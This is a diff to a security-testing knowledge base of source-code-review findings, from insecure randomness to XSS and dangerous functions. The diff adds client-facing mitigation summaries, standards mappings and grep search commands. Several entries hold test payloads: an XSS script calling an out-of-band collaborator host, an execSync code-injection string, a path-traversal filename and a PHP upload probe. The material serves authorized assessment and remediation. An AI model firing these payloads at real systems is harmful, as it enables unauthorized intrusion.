+    "A nonce derived from a counter that resets on restart, so the same nonce recurs across restarts rather than being fixed outright."
    ],
    "mitigation": [
     "Generate a fresh, cryptographically random IV/nonce for every single encryption operation, using a CSPRNG, and store/transmit it alongside the resulting ciphertext (IVs don't need to be secret, only unique).",
@@ -1123,6 +1558,7 @@
     "Use a well-maintained, high-level cryptographic library that handles IV/nonce generation and management correctly by default, rather than manually managing this parameter.",
     "Add a static-analysis rule flagging any hardcoded IV/nonce literal passed to an encryption call as a mandatory code-review blocker."
    ],
+   "mitigationClientFacing": "A review of your encryption code found a fixed value used where a unique one is required for each operation, which weakens the encryption and can, over many operations, leak information about the protected data. Correct encryption depends on this value being fresh each time. The fix is to generate it randomly for every encryption rather than fixing it in the code. This is a specific cryptographic implementation error: the algorithm is sound but is being used incorrectly, and the correction is contained. Confirm on the built application that each encryption uses a fresh value rather than the reused one found in the source.",
    "reference": {
     "standard": "A02:2021 - Cryptographic Failures",
     "cwe": "CWE-329",
@@ -1142,12 +1578,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A04",
+   "categoryName": "Cryptographic Failures",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CRYP",
+     "name": "Cryptography"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V11",
+     "name": "Cryptography"
+    }
+   ]
   },
   {
    "id": "SRC-017",
    "domain": "SRC",
-   "phase": 471,
    "title": "Insecure Randomness",
    "sequence": 471,
    "severity": "high",
@@ -1161,7 +1618,8 @@
     "Search the codebase for every generation call site producing a value later used for a security purpose (tokens, session IDs, API keys, one-time codes) and identify the specific randomness API used at each.",
     "Confirm whether each is a cryptographically secure generator or a standard, non-cryptographic one.",
     "Where a CSPRNG is used, confirm it isn't seeded with a predictable value.",
-    "Build and run the application, collect a sample of generated values for a representative, security-relevant use case, and statistically analyze them for patterns consistent with the weak generator identified in source."
+    "Build and run the application, collect a sample of generated values for a representative, security-relevant use case, and statistically analyze them for patterns consistent with the weak generator identified in source.",
+    "Trace security-relevant random values to their generator and confirm empirically that outputs are predictable rather than relying on the source classification alone."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes value-sample collection and predictability analysis against a running build of the reviewed application.",
@@ -1177,16 +1635,21 @@
     },
     {
      "label": "Collect a sample of generated password-reset tokens for test accounts",
-     "command": "for i in $(seq 1 20); do curl -s -X POST https://app.target.com/password-reset -d '{\"email\":\"test'$i'@example.com\"}'; done"
+     "command": "for i in $(seq 1 20); do curl -s -X POST https://<app>/password-reset -d '{\"email\":\"test'$i'@example.test\"}'; done"
     },
     {
      "label": "Statistically test collected values for predictability",
      "command": "python3 analyze_token_entropy.py collected_reset_tokens.txt"
+    },
+    {
+     "label": "Search source for security-relevant values drawn from a non-cryptographic generator",
+     "command": "grep -rnE 'Math\\.random|util\\.Random|rand\\(\\)|mt_rand' src/ | grep -iE 'token|key|nonce|salt|iv|otp'"
     }
    ],
    "variants": [
     "Weak randomness affecting a password-reset token specifically (directly enabling account takeover) versus a lower-stakes value like a non-security-relevant UI identifier that happens to use the same weak, shared utility function.",
-    "A cryptographically-appropriate generator undermined by a predictable seed, rather than the generator choice itself being the flaw."
+    "A cryptographically-appropriate generator undermined by a predictable seed, rather than the generator choice itself being the flaw.",
+    "A secure generator seeded from a predictable value such as the process time, which reintroduces predictability despite the correct algorithm."
    ],
    "mitigation": [
     "Use a cryptographically secure random number generator for every security-sensitive value, without exception.",
@@ -1194,6 +1657,7 @@
     "Audit the codebase for every randomness-generation call site as part of a security-focused code review, tagging and consistently treating every security-relevant use with the correct API.",
     "Ensure generated tokens/identifiers carry sufficient length/entropy (128 bits or more) regardless of the specific generator chosen."
    ],
+   "mitigationClientFacing": "Your code generates security-relevant values — tokens, keys, identifiers — using a method that is predictable rather than truly random, which lets an attacker anticipate them and defeat whatever they protect. Randomness is the foundation these protections rest on. The fix is to draw all security-relevant values from the platform's proper cryptographic random source, and to ensure it is not seeded from anything guessable such as the current time. This is a contained code change, but its consequences reach whatever those values protect — sessions, password resets, keys — so it warrants prompt attention and confirmation on the running system.",
    "reference": {
     "standard": "A02:2021 - Cryptographic Failures",
     "cwe": "CWE-330",
@@ -1213,12 +1677,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A04",
+   "categoryName": "Cryptographic Failures",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CRYP",
+     "name": "Cryptography"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V11",
+     "name": "Cryptography"
+    }
+   ]
   },
   {
    "id": "SRC-018",
    "domain": "SRC",
-   "phase": 472,
    "title": "Weak Cryptography (Algorithm/Mode)",
    "sequence": 472,
    "severity": "high",
@@ -1232,7 +1717,8 @@
     "Search the codebase for cryptographic algorithm/mode selection strings or constants (`DES`, `RC4`, `ECB`, `MD5`, `SHA1`) in any encryption or hashing call.",
     "For each identified use, confirm the specific security property the code relies on that algorithm/mode for (confidentiality, integrity, collision-resistance) to assess whether the specific weakness is actually relevant to that use case.",
     "Where ECB mode is identified for encrypting data with repeating structure (an image, a structured record), build and run the application to encrypt a representative sample and visually/statistically confirm the pattern-leakage is observable in the resulting ciphertext.",
-    "Where MD5/SHA-1 is used for a genuinely collision-resistance-dependent purpose (a digital signature, a deduplication scheme relying on uniqueness), assess the practical feasibility of a collision attack in that specific context."
+    "Where MD5/SHA-1 is used for a genuinely collision-resistance-dependent purpose (a digital signature, a deduplication scheme relying on uniqueness), assess the practical feasibility of a collision attack in that specific context.",
+    "Trace the algorithm and mode in code against current guidance, and confirm by testing that the weak construction is actually used on sensitive data at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes cryptographic-analysis testing against a running build (or standalone harness) of the reviewed encryption/hashing code.",
@@ -1253,11 +1739,16 @@
     {
      "label": "Check for a feasible MD5 collision in a collision-resistance-dependent use case",
      "command": "# use a public MD5-collision-generation tool (e.g. hashclash) to produce two distinct inputs sharing the same MD5 hash, relevant if the application relies on MD5 uniqueness for integrity/dedup purposes"
+    },
+    {
+     "label": "Search source for weak or broken cryptographic algorithms and modes",
+     "command": "grep -rnE 'MD5|SHA1|DES|RC4|ECB|Cipher\\.getInstance\\(\"' src/"
     }
    ],
    "variants": [
     "ECB mode used for encrypting genuinely structured, pattern-rich data (high real-world impact from visible leakage) versus for data with little inherent structure (lower, though still present, real-world impact).",
-    "MD5/SHA-1 used purely for non-adversarial checksumming (lower practical risk) versus used in a context genuinely relying on collision-resistance against an adversary (a digital-signature or certificate-related use, high practical risk)."
+    "MD5/SHA-1 used purely for non-adversarial checksumming (lower practical risk) versus used in a context genuinely relying on collision-resistance against an adversary (a digital-signature or certificate-related use, high practical risk).",
+    "A strong algorithm used in an insecure mode — a block cipher in ECB — which leaks structure despite the algorithm itself being sound."
    ],
    "mitigation": [
     "Replace DES/RC4 with a current, strong algorithm (AES-256) for any encryption use.",
@@ -1265,6 +1756,7 @@
     "Replace MD5/SHA-1 with SHA-256 or stronger for any hashing use where collision-resistance genuinely matters; for password hashing specifically, use a dedicated password-hashing function (bcrypt, scrypt, Argon2) rather than a general-purpose cryptographic hash at all.",
     "Add a static-analysis rule flagging any use of a deprecated algorithm/mode name as a mandatory code-review blocker, and periodically audit the codebase for cryptographic-primitive currency against current guidance."
    ],
+   "mitigationClientFacing": "A review of your code found the use of weak or outdated cryptography — an algorithm or mode no longer considered secure — to protect sensitive data, which means that protection is weaker than assumed and may be breakable. The fix is to move to current, strong algorithms and modes in line with present guidance, and to re-protect any data secured with the weak method, since data already encrypted weakly stays weak until redone. This is a well-understood upgrade, but it needs care to cover existing data as well as new, and the corrected code should be confirmed on the running application.",
    "reference": {
     "standard": "A02:2021 - Cryptographic Failures",
     "cwe": "CWE-327",
@@ -1285,12 +1777,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A04",
+   "categoryName": "Cryptographic Failures",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CRYP",
+     "name": "Cryptography"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V11",
+     "name": "Cryptography"
+    }
+   ]
   },
   {
    "id": "SRC-019",
    "domain": "SRC",
-   "phase": 473,
    "title": "Insecure File Upload Handling (Source-Identified)",
    "sequence": 473,
    "severity": "high",
@@ -1304,7 +1817,8 @@
     "Trace the complete file-upload-handling code path: how is the filename derived and sanitized (if at all), where is the file stored relative to the web-servable root, and what (if any) size/type/count limits are enforced.",
     "Confirm whether the storage location is configured to prevent script execution (via web-server configuration) independent of what the application code itself does.",
     "Build and run the application, then attempt to upload a file with a path-traversal-crafted filename (`../../etc/test_poc`) and confirm whether it's written outside the intended directory.",
-    "Separately, attempt to upload and then access a script-type file to confirm whether the storage location actually executes it."
+    "Separately, attempt to upload and then access a script-type file to confirm whether the storage location actually executes it.",
+    "Build the application and submit a file that violates the intended restriction to confirm the upload handler accepts it at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes file-upload handling testing against a running build of the reviewed application.",
@@ -1320,16 +1834,21 @@
     },
     {
      "label": "Attempt a path-traversal filename upload",
-     "command": "curl -s -X POST https://app.target.com/upload -F 'file=@test.txt;filename=../../../../tmp/poc_traversal_test.txt'"
+     "command": "curl -s -X POST https://<app>/upload -F 'file=@test.txt;filename=../../../../tmp/poc_traversal_test.txt'"
     },
     {
      "label": "Attempt upload and execution of a script-type file",
-     "command": "curl -s -X POST https://app.target.com/upload -F 'file=@shell_poc.php'\ncurl -s https://app.target.com/uploads/shell_poc.php"
+     "command": "curl -s -X POST https://<app>/upload -F 'file=@shell_poc.php'\ncurl -s https://<app>/uploads/shell_poc.php"
+    },
+    {
+     "label": "Search source for file upload handling that omits type, size or destination checks",
+     "command": "grep -rnE 'MultipartFile|req\\.file|save.*upload|write.*filename|move_uploaded_file' src/"
     }
    ],
    "variants": [
     "Path-traversal-vulnerable filename handling versus execution-permitting storage location — these are distinct, independent gaps that may exist together or separately.",
-    "Missing size/count limits enabling a storage-exhaustion denial-of-service, distinct from the code-execution/traversal-focused variants."
+    "Missing size/count limits enabling a storage-exhaustion denial-of-service, distinct from the code-execution/traversal-focused variants.",
+    "An upload whose type is validated but which is written to a location the web server will execute, turning a benign-looking file into server-side code execution."
    ],
    "mitigation": [
     "Sanitize uploaded filenames strictly (strip path-traversal sequences, generate a new, random server-side filename rather than trusting the client-supplied one at all).",
@@ -1337,6 +1856,7 @@
     "Enforce explicit maximum file size, allowed file-type, and per-user/per-timeframe upload-count limits.",
     "Combine with independent content-type verification (see the related Content-Type-trust finding) for complete, defense-in-depth upload security."
    ],
+   "mitigationClientFacing": "Your file-upload code does not adequately check what is being uploaded — its type, size, or where it is stored — which can let an attacker upload a dangerous file, in the worst case one the server will execute. The fix is to validate a file's real content rather than its claimed type, cap its size, and store uploads outside any location the web server can execute, giving them names the application controls. This is a common route to serious compromise when an uploaded file lands somewhere executable, so it warrants prompt attention and confirmation that the running application enforces the checks.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-434",
@@ -1356,12 +1876,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1505.003",
+     "name": "Web Shell",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V5",
+     "name": "File Handling"
+    }
+   ]
   },
   {
    "id": "SRC-020",
    "domain": "SRC",
-   "phase": 474,
    "title": "Cleartext Storage of Sensitive Data",
    "sequence": 474,
    "severity": "high",
@@ -1375,7 +1916,8 @@
     "Locate every code path writing sensitive data (credentials, PII, payment data) to persistent storage, and confirm whether any hashing/encryption transformation is applied immediately before the write.",
     "For credential storage specifically, confirm whether a proper, dedicated password-hashing function (bcrypt/scrypt/Argon2) is used, versus a general-purpose hash or, worse, no transformation at all.",
     "Build and run the application, populate representative test data, then directly inspect the backing data store to confirm the actual stored format matches (or contradicts) what the source code review indicated.",
-    "Cross-reference which specific sensitive fields lack protection versus which are correctly protected, since this is commonly an inconsistent, partial gap rather than a uniform absence across every field."
+    "Cross-reference which specific sensitive fields lack protection versus which are correctly protected, since this is commonly an inconsistent, partial gap rather than a uniform absence across every field.",
+    "Build the application, populate test data, and inspect the backing store directly to confirm the sensitive field is stored unprotected at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes direct data-store inspection of a test environment populated with representative sensitive test data.",
@@ -1391,12 +1933,21 @@
     },
     {
      "label": "Directly inspect the test database for stored credential format",
-     "command": "mysql -h test-db -u test -p -e \"SELECT password FROM users WHERE email='test@example.com';\""
+     "command": "mysql -h test-db -u test -p -e \"SELECT password FROM users WHERE email='test@example.test';\""
+    },
+    {
+     "label": "Search source for credential storage bypassing a proper password-hashing function",
+     "command": "grep -rnE 'INSERT INTO users|password\\s*=|save.*password' src/ | grep -viE 'bcrypt|scrypt|argon2|pbkdf2'"
+    },
+    {
+     "label": "Confirm the stored format of a sensitive field in the running application's data store",
+     "command": "# populate a test record and inspect the backing store to confirm the field is stored unprotected"
     }
    ],
    "variants": [
     "Credentials stored in plaintext (most severe, direct account-takeover risk for every affected account if the store is ever exposed) versus stored with a fast, general-purpose hash (MD5/SHA-256) rather than a proper, slow password-hashing function.",
-    "PII/financial data stored without at-rest encryption, distinct from credential-specific hashing concerns."
+    "PII/financial data stored without at-rest encryption, distinct from credential-specific hashing concerns.",
+    "Sensitive data encrypted in transit and at the boundary but written to an internal cache or queue in cleartext, which a review of the primary store overlooks."
    ],
    "mitigation": [
     "Hash all credentials using a dedicated, slow password-hashing function (bcrypt, scrypt, or Argon2) with an appropriate work factor, never a general-purpose fast hash or plaintext storage.",
@@ -1404,6 +1955,7 @@
     "Conduct a systematic, field-by-field data-model review specifically for sensitive-data-protection consistency, since new fields added later commonly miss the protection convention established for older ones.",
     "Add a static-analysis rule or code-review checklist item flagging any new sensitive-data-model field for a mandatory storage-protection review before merge."
    ],
+   "mitigationClientFacing": "A review of your code found sensitive data — credentials, personal or payment information — stored without protection, so anyone who reaches the data store can read it directly. For passwords specifically, this means account takeover for every affected user if the store is exposed. The fix is to protect sensitive data at rest: hash passwords with a proper password-hashing function, and encrypt other sensitive data. Check internal caches and queues as well as the main store, since data protected at the boundary is sometimes written unprotected internally. Confirm on the running application that the stored format is protected rather than cleartext.",
    "reference": {
     "standard": "A02:2021 - Cryptographic Failures",
     "cwe": "CWE-312",
@@ -1423,12 +1975,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A04",
+   "categoryName": "Cryptographic Failures",
+   "attack": [
+    {
+     "id": "T1552",
+     "name": "Unsecured Credentials",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-CRYP",
+     "name": "Cryptography"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V14",
+     "name": "Data Protection"
+    }
+   ]
   },
   {
    "id": "SRC-021",
    "domain": "SRC",
-   "phase": 475,
    "title": "Missing Server-Side Validation Duplicated from Client-Side Only",
    "sequence": 475,
    "severity": "high",
@@ -1442,7 +2015,8 @@
     "For each significant business rule/validation constraint found in client-side JavaScript, search the corresponding server-side endpoint handler for an equivalent, independent validation check.",
     "Flag any rule present client-side but with no server-side counterpart at all.",
     "Build and run the application, then bypass the client-side check (via a direct API call using Burp/curl, skipping the browser and its JavaScript entirely) and observe whether the server processes the otherwise-blocked value.",
-    "Assess the specific impact of each confirmed gap based on what the bypassed rule was meant to enforce."
+    "Assess the specific impact of each confirmed gap based on what the bypassed rule was meant to enforce.",
+    "Build the application and submit input the client would reject directly to the server to confirm the server does not independently validate it."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes client-bypass testing against a running build of the reviewed application.",
@@ -1462,12 +2036,17 @@
     },
     {
      "label": "Submit a direct API request bypassing the client-side-only check",
-     "command": "curl -s -X POST https://app.target.com/api/checkout -H \"Authorization: Bearer <test-token>\" -d '{\"itemId\":\"test-item\",\"quantity\":99999}'"
+     "command": "curl -s -X POST https://<app>/api/checkout -H \"Authorization: Bearer <test-token>\" -d '{\"itemId\":\"test-item\",\"quantity\":99999}'"
+    },
+    {
+     "label": "Search source for validation present in the client but absent from the server handler",
+     "command": "grep -rnE 'validate|schema|assert|check' src/ | grep -iE 'server|controller|handler|api'"
     }
    ],
    "variants": [
     "Missing server-side validation of a business-logic constraint (a quantity/price limit) versus of a basic input-format constraint (an email format, a required field) — the former typically carries more direct business impact.",
-    "Client-side check entirely absent server-side, versus present but implemented inconsistently/more permissively than the client-side version (a partial, rather than complete, gap)."
+    "Client-side check entirely absent server-side, versus present but implemented inconsistently/more permissively than the client-side version (a partial, rather than complete, gap).",
+    "A server that validates format but not authorisation-relevant constraints — a quantity or price bound — trusting the client to have enforced the business rule."
    ],
    "mitigation": [
     "Implement every significant validation rule and business constraint server-side as the authoritative enforcement point, treating client-side validation purely as a user-experience convenience that provides no actual security or data-integrity guarantee.",
@@ -1475,6 +2054,7 @@
     "Include a systematic client-bypass test pass (submitting requests directly to the API for every significant client-side-validated field) as part of the standard security-focused test suite.",
     "Never assume a request originated from, or was constrained by, the official client application; treat every server-side input as fully untrusted regardless of its apparent origin."
    ],
+   "mitigationClientFacing": "Your code relies on the client to validate input and does not repeat that validation on the server, so an attacker who bypasses the client — which is entirely within their control — can submit values your server will wrongly accept. Client-side validation is a convenience for users, not a security control. The fix is to validate all input on the server independently, covering not only format but the business constraints the client was trusted to enforce, such as quantity or price bounds. This is a foundational principle, and the corrected server-side checks should be confirmed against inputs the client would have rejected.",
    "reference": {
     "standard": "A04:2021 - Insecure Design",
     "cwe": "CWE-602",
@@ -1494,12 +2074,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A06",
+   "categoryName": "Insecure Design",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-BUSL",
+     "name": "Business Logic"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V2",
+     "name": "Validation and Business Logic"
+    }
+   ]
   },
   {
    "id": "SRC-022",
    "domain": "SRC",
-   "phase": 476,
    "title": "Cross-Site Scripting (Source-Identified)",
    "sequence": 476,
    "severity": "high",
@@ -1513,7 +2114,8 @@
     "Search templates/rendering code for explicit \"raw\"/\"safe\"/unescaped output directives, and for direct DOM-manipulation calls (`innerHTML`, `dangerouslySetInnerHTML`, `document.write`) that bypass a templating engine's auto-escaping.",
     "For each identified location, trace the rendered value back to confirm it's genuinely user-controllable (directly or via stored data from another user).",
     "Build and run the application, then submit a benign, verifiable script payload (an alert or a request to a controlled listener) to the identified input and observe whether it executes when the affected page is rendered.",
-    "Where the value is stored and rendered to other users (a profile field, a comment), confirm the payload persists and executes for a separate viewing session, distinguishing stored from reflected XSS."
+    "Where the value is stored and rendered to other users (a profile field, a comment), confirm the payload persists and executes for a separate viewing session, distinguishing stored from reflected XSS.",
+    "Build the application and render attacker-influenced input to confirm it reaches the page without encoding and executes in the browser."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes XSS testing against a running build of the reviewed application.",
@@ -1529,16 +2131,21 @@
     },
     {
      "label": "Submit a benign, verifiable script payload to the identified input",
-     "command": "curl -s -X POST https://app.target.com/profile -H \"Authorization: Bearer <test-token>\" -d '{\"bio\":\"<script>fetch(\\\"https://<your-collaborator-id>.oastify.com/xss-confirmed\\\")</script>\"}'"
+     "command": "curl -s -X POST https://<app>/profile -H \"Authorization: Bearer <test-token>\" -d '{\"bio\":\"<script>fetch(\\\"https://<your-collaborator-id>.oastify.com/xss-confirmed\\\")</script>\"}'"
     },
     {
      "label": "Confirm stored-XSS execution from a separate viewing session",
      "command": "# visit the affected profile page from a different browser/session and confirm the callback fires"
+    },
+    {
+     "label": "Search source for unencoded output of request-derived data into a page",
+     "command": "grep -rnE 'innerHTML|dangerouslySetInnerHTML|\\.html\\(|render.*\\+|document\\.write' src/"
     }
    ],
    "variants": [
     "Stored XSS (the payload persists in the data store and executes for every subsequent viewer) versus reflected XSS (the payload is present only in the immediate request/response and requires the victim to click a crafted link).",
-    "XSS via an explicit \"safe\"/raw templating directive versus via direct client-side DOM manipulation (`innerHTML`) that bypasses the templating engine's protection entirely."
+    "XSS via an explicit \"safe\"/raw templating directive versus via direct client-side DOM manipulation (`innerHTML`) that bypasses the templating engine's protection entirely.",
+    "Stored cross-site scripting, where the payload is persisted and served to other users, distinct from a reflected instance affecting only the submitter."
    ],
    "mitigation": [
     "Rely on the templating engine's default auto-escaping for all user-controllable output; avoid \"raw\"/\"safe\"/unescaped output directives unless the value has been rigorously sanitized through a dedicated HTML-sanitization library first.",
@@ -1546,6 +2153,7 @@
     "Avoid direct DOM manipulation (`innerHTML`) with user-controllable data in client-side JavaScript; use safe, text-only DOM APIs (`textContent`) or the framework's own safe-rendering mechanisms instead.",
     "Apply a strict Content-Security-Policy as a defense-in-depth layer, limiting the impact of any XSS that does slip through despite output-encoding controls."
    ],
+   "mitigationClientFacing": "A review of your code found user input placed into web pages without being properly encoded, which lets an attacker inject scripts that run in other users' browsers — stealing sessions, altering the page, or acting as the victim. The fix is to encode all user-supplied data appropriately for the context it appears in before it reaches the page, so it is displayed as text rather than executed as code. Pay attention to stored instances, where the injected script is saved and served to many users, as these are more damaging than one-off reflected cases. Confirm the fix on the running application.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-79",
@@ -1565,12 +2173,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V1",
+     "name": "Encoding and Sanitization"
+    }
+   ]
   },
   {
    "id": "SRC-023",
    "domain": "SRC",
-   "phase": 477,
    "title": "Dangerous Function / API Usage",
    "sequence": 477,
    "severity": "high",
@@ -1584,7 +2213,8 @@
     "Search the codebase for calls to well-known dangerous functions for the specific language in use (`eval`, `exec`, `strcpy`, `gets`, `Function()` constructor with a string argument).",
     "For each call found, trace its input parameter back to confirm whether it can be influenced, directly or indirectly, by untrusted (user-supplied) data.",
     "Where the input is confirmed attacker-influenceable, classify the specific resulting vulnerability class (code injection if it's a dynamic-evaluation function, buffer overflow if it's an unbounded native string function) and cross-reference with the more specific, dedicated finding for that class.",
-    "Where the function is called only with fully fixed, developer-controlled input (no untrusted influence), note it as a lower-priority hygiene/best-practice finding rather than a directly exploitable one."
+    "Where the function is called only with fully fixed, developer-controlled input (no untrusted influence), note it as a lower-priority hygiene/best-practice finding rather than a directly exploitable one.",
+    "Trace each dangerous-function call to its input and build the application to confirm attacker-influenced data reaches it at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes exploitation testing for the specific vulnerability class identified as reachable through the dangerous function call.",
@@ -1604,12 +2234,17 @@
     },
     {
      "label": "Confirm exploitability with a benign proof-of-concept input",
-     "command": "curl -s -X POST https://app.target.com/calculate -d '{\"expression\":\"1+1; require(\\x27child_process\\x27).execSync(\\x27id\\x27)\"}'"
+     "command": "curl -s -X POST https://<app>/calculate -d '{\"expression\":\"1+1; require(\\x27child_process\\x27).execSync(\\x27id\\x27)\"}'"
+    },
+    {
+     "label": "Search source for inherently dangerous function usage",
+     "command": "grep -rnE 'eval\\(|exec\\(|setTimeout\\(\"|new Function\\(|assert\\(|deserialize' src/"
     }
    ],
    "variants": [
     "A dynamic-code-evaluation function (`eval`) fed attacker-influenceable input, a direct code-injection precursor, versus an unbounded native string-copy function (`strcpy`) in a lower-level language, a buffer-overflow precursor.",
-    "The dangerous function called with fully fixed, non-attacker-influenceable input (a hygiene finding, not directly exploitable) versus with confirmed, traceable untrusted input (a directly exploitable finding)."
+    "The dangerous function called with fully fixed, non-attacker-influenceable input (a hygiene finding, not directly exploitable) versus with confirmed, traceable untrusted input (a directly exploitable finding).",
+    "A dangerous function reached only through a less-obvious wrapper, so a search for the function name alone under-reports its true reachability."
    ],
    "mitigation": [
     "Eliminate use of `eval()`/dynamic-code-evaluation functions on any string that could ever contain untrusted input; use a safe, purpose-built parser (a math-expression evaluator library, a JSON parser) for the specific legitimate use case instead.",
@@ -1617,6 +2252,7 @@
     "Add a static-analysis (SAST) rule flagging any use of a known-dangerous function as a mandatory code-review item, requiring explicit justification and confirmation of non-attacker-influenceable input if the call must remain.",
     "Where source access allows, conduct a periodic, dedicated sweep for dangerous-function usage as part of routine secure-code-review practice, not just during external assessments."
    ],
+   "mitigationClientFacing": "Your code uses functions that are inherently dangerous — capable of executing arbitrary code or commands — with input an attacker can influence, which can lead to code execution on the server. The fix is to avoid these functions where a safer alternative exists, and where one is genuinely required, to ensure no attacker-influenced data can reach it. Because these functions are sometimes reached through wrappers rather than called directly, the review traced their true reachability rather than their names alone. This is a high-impact pattern, so the identified uses should be corrected and confirmed on the built application.",
    "reference": {
     "standard": "A03:2021 - Injection",
     "cwe": "CWE-676",
@@ -1636,12 +2272,33 @@
     "affectedEndpoints": [],
     "status": "not-tested"
    },
-   "flagged": false
+   "flagged": false,
+   "categoryStandard": "OWASP Top 10:2025",
+   "categoryCode": "A05",
+   "categoryName": "Injection",
+   "attack": [
+    {
+     "id": "T1190",
+     "name": "Exploit Public-Facing Application",
+     "matrix": "enterprise"
+    }
+   ],
+   "frameworks": [
+    {
+     "standard": "OWASP WSTG v4.2",
+     "code": "WSTG-INPV",
+     "name": "Input Validation"
+    },
+    {
+     "standard": "OWASP ASVS 5.0",
+     "code": "V15",
+     "name": "Secure Coding and Architecture"
+    }
+   ]
   },
   {
    "id": "SRC-024",
    "domain": "SRC",
-   "phase": 478,
    "title": "Improper Error/Exception Handling",
    "sequence": 478,
    "severity": "medium",
@@ -1655,7 +2312,8 @@
     "Locate the application's global/top-level error handler and confirm exactly what detail it includes in the response sent to the client for an unhandled exception.",
     "Confirm whether the handler's verbose behavior is gated by an environment/configuration flag (development vs. production mode), and if so, whether the production environment is confirmed to actually have that flag set correctly.",
     "Build and run the application in its production configuration, then trigger a representative unhandled-error condition (malformed input designed to cause an exception rather than a graceful validation rejection) and inspect the actual response.",
-    "Confirm whether the response includes a stack trace, internal file paths, or raw database error content."
+    "Confirm whether the response includes a stack trace, internal file paths, or raw database error content.",
+    "Build the application and trigger the error path to confirm that a failure reveals sensitive detail or defaults to an insecure outcome at run time."
    ],
    "exploitationSteps": [
     "Confirm scope authorizes error-triggering testing against a running build of the reviewed application, in its production (or production-equivalent) configuration.",
@@ -1671,16 +2329,21 @@
     },
     {
      "label": "Trigger a representative unhandled exception with malformed input",
-     "command": "curl -s -X POST https://app.target.com/api/process -H 'Content-Type: application/json' -d '{malformed_json'"
+     "command": "curl -s -X POST https://<app>/api/process -H 'Content-Type: application/json' -d '{malformed_json'"
     },
     {
      "label": "Trigger a database-level exception via a crafted, unexpected value",
-     "command": "curl -s https://app.target.com/api/records/not-a-valid-id-format"
+     "command": "curl -s https://<app>/api/records/not-a-valid-id-format"
+    },
+    {
+     "label": "Search source for error handling that leaks detail or fails open",
+     "command": "grep -rnE 'printStackTrace|catch.*\\{\\s*\\}|except:\\s*pass|console\\.log\\(err|res\\.send\\(err' src/"
     }
    ],
    "variants": [
     "Verbose error handling present unconditionally regardless of environment, versus correctly gated by a development/production flag but the production environment's flag is misconfigured/left at the development default.",
-    "Leaked stack trace/file-path detail (reconnaissance-value information disclosure) versus a leaked raw database error/connection string (potentially directly sensitive data disclosure) — the latter is materially more severe."
+    "Leaked stack trace/file-path detail (reconnaissance-value information disclosure) versus a leaked raw database error/connection string (potentially directly sensitive data disclosure) — the latter is materially more severe.",
+    "An error path that fails open — granting access or skipping a check when an exception occurs — rather than merely disclosing detail, which is the more serious variant."
    ],
    "mitigation": [
     "Configure a global error handler that returns a generic, non-verbose error message and appropriate status code to the client in production, logging the full exception detail server-side only, never in the client-facing response.",
@@ -1688,6 +2351,7 @@
     "Apply the generic-error-response behavior consistently across every error type (validation errors, unhandled exceptions, database errors) rather than only the most obviously anticipated ones.",
